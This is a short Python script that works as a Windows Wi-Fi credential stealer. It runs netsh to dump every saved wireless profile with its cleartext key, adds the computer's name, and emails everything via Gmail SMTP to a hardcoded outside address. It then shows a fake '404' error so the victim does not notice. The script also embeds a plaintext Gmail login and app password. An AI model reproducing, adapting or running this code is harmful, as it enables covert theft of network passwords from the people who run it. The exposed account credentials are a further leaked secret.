import smtplib
from email.message import EmailMessage

import subprocess
import re
import time
import platform

def email_alert(subject, body, to):
    msg = EmailMessage()
    msg.set_content(body)
    msg['subject'] = subject
    msg['to'] = to

    user = "Pikachu0304xd@gmail.com"
    msg['from'] = user
    password = "kismreeqtucjsdik"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(user, password)
    server.send_message(msg)
    server.quit()

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = []

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name

            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()

            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["password"] = None
            else:

                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile) 
text=""
text=text+"Name of PC-> "+platform.node()+"\n\n\n"
for x in range(len(wifi_list)):
    # print(wifi_list[x])
    text=text+"\n"+str(wifi_list[x])
    
email_alert("Wifi Passwords", text, "omdhawan02@gmail.com")
print("404. That's an error!")
time.sleep(3)
